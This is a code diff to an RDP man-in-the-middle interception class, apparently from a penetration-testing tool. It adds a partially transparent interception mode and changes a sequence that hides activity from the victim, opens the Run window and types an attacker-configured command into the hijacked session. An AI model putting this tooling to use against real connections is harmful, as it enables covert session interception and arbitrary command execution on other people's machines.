@@ -191,7 +191,13 @@ class RDPMITM:
         serverFactory = AwaitableClientFactory(self.server.tcp)
         if self.config.transparent:
             src = self.client.tcp.transport.client
-            connectTransparent(self.config.targetHost, self.config.targetPort, serverFactory, bindAddress=(src[0], 0))
+            if self.config.targetHost:
+                # Fully Transparent (with a specific poisoned target.)
+                connectTransparent(self.config.targetHost, self.config.targetPort, serverFactory, bindAddress=(src[0], 0))
+            else:
+                # Half Transparent (for client-side only)
+                dst = self.client.tcp.transport.getHost().host
+                reactor.connectTCP(dst, self.config.targetPort, serverFactory)
         else:
             reactor.connectTCP(self.config.targetHost, self.config.targetPort, serverFactory)
 
@@ -264,7 +270,7 @@ class RDPMITM:
         self.security = SecurityMITM(self.client.security, self.server.security, self.getLog("security"), self.config, self.state, self.recorder)
         self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath, self.state, self.statCounter)
 
-        if self.player.tcp.transport:
+        if self.player.tcp.transport or self.config.payload:
             self.attacker = AttackerMITM(self.client.fastPath, self.server.fastPath, self.player.player, self.log, self.state, self.recorder)
 
             if MCSChannelName.DEVICE_REDIRECTION in self.state.channelMap:
@@ -390,8 +396,7 @@ class RDPMITM:
             return 200
 
         def sendPayload() -> int:
-            self.attacker.sendText(self.config.payload + " & exit")
-            return 200
+            return self.attacker.sendText(self.config.payload + " & exit")
 
         def waitForPayload() -> int:
             return self.config.payloadDuration
@@ -400,13 +405,15 @@ class RDPMITM:
             self.state.forwardInput = True
             self.state.forwardOutput = True
 
+
+        payload = sendPayload()
         sequencer = AsyncIOSequencer([
             waitForDelay,
             disableForwarding,
             openRunWindow,
             sendCMD,
             sendEnterKey,
-            sendPayload,
+            *payload,
             sendEnterKey,
             waitForPayload,
             enableForwarding
